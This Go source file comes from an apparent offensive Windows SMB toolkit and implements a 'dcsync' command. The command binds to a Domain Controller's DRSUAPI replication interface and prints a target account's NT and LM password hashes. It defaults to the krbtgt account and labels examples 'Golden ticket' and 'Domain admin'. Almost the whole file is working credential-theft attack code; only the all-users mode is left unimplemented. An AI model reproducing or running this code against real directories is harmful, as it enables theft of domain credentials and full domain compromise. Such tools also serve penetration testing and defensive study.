package main

import (
	"context"
	"fmt"
	"strings"

	"github.com/ineffectivecoder/SMBGooser/pkg/drsuapi"
)

func init() {
	commands.Register(&Command{
		Name:        "dcsync",
		Aliases:     []string{"secretsdump-dc", "replicate"},
		Description: "DCSync attack - replicate password hashes from DC",
		Usage:       "dcsync [options]",
		Handler:     cmdDCSync,
	})
}

// cmdDCSync performs a DCSync attack
func cmdDCSync(ctx context.Context, args []string) error {
	if client == nil || session == nil {
		return fmt.Errorf("not connected")
	}

	// Parse arguments
	targetUser := ""
	allUsers := false

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-user", "--user", "-u":
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		case "-all", "--all", "-a":
			allUsers = true
		case "help":
			printDCSyncHelp()
			return nil
		default:
			if !strings.HasPrefix(args[i], "-") && targetUser == "" {
				targetUser = args[i]
			}
		}
	}

	if targetUser == "" && !allUsers {
		targetUser = "krbtgt" // Default high-value target
	}

	info_("Connecting to DRSUAPI service...")

	// Create DRSUAPI client
	drsClient, err := drsuapi.NewClient(ctx, client)
	if err != nil {
		return fmt.Errorf("failed to create DRSUAPI client: %w", err)
	}
	defer drsClient.Close()

	// Generate a random client GUID
	clientGUID := [16]byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
		0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10}

	info_("Binding to DRS interface...")
	if err := drsClient.Bind(clientGUID); err != nil {
		return fmt.Errorf("DRSBind failed: %w", err)
	}

	fmt.Println()
	fmt.Printf("  %sDCSync - Replicating secrets from %s%s\n", colorBold, targetHost, colorReset)
	fmt.Println("  " + strings.Repeat("-", 60))

	if allUsers {
		info_("Replicating all users (this may take a while)...")
		// Would need to enumerate all users first
		fmt.Println("  [!] Full replication not yet implemented")
		fmt.Println("  [!] Use: dcsync krbtgt")
		fmt.Println("  [!] Use: dcsync Administrator")
	} else {
		info_("Requesting replication for: %s", targetUser)

		// Build DN from user
		// This is simplified - real impl needs domain DN
		domainDN := "DC=" + strings.ReplaceAll(currentDomain, ".", ",DC=")
		userDN := fmt.Sprintf("CN=%s,CN=Users,%s", targetUser, domainDN)

		secret, err := drsClient.GetNCChanges(userDN, domainDN)
		if err != nil {
			return fmt.Errorf("replication failed: %w", err)
		}

		if secret != nil {
			fmt.Println()
			if secret.NTHash != "" {
				fmt.Printf("  %s%s%s\n", colorGreen, targetUser, colorReset)
				fmt.Printf("    NT Hash: %s\n", secret.NTHash)
				if secret.LMHash != "" && secret.LMHash != "aad3b435b51404eeaad3b435b51404ee" {
					fmt.Printf("    LM Hash: %s\n", secret.LMHash)
				}
			} else {
				fmt.Println("  No password hash in response")
				fmt.Println("  (May need Replicating Directory Changes rights)")
			}
		}
	}

	fmt.Println()

	return nil
}

func printDCSyncHelp() {
	fmt.Println("\nUsage: dcsync [user] [options]")
	fmt.Println("\nReplicate password hashes from a Domain Controller via DRSUAPI.")
	fmt.Println("\nRequirements:")
	fmt.Println("  - Target must be a Domain Controller")
	fmt.Println("  - Account needs 'Replicating Directory Changes' rights")
	fmt.Println("  - Usually: Domain Admins, Enterprise Admins, or DC machine accounts")
	fmt.Println("\nOptions:")
	fmt.Println("  -user <name>   Target user to replicate")
	fmt.Println("  -all           Replicate all users (slow)")
	fmt.Println("\nExamples:")
	fmt.Println("  dcsync krbtgt           # Golden ticket")
	fmt.Println("  dcsync Administrator    # Domain admin")
	fmt.Println("  dcsync -user YOURUSER$  # Machine account")
	fmt.Println()
}
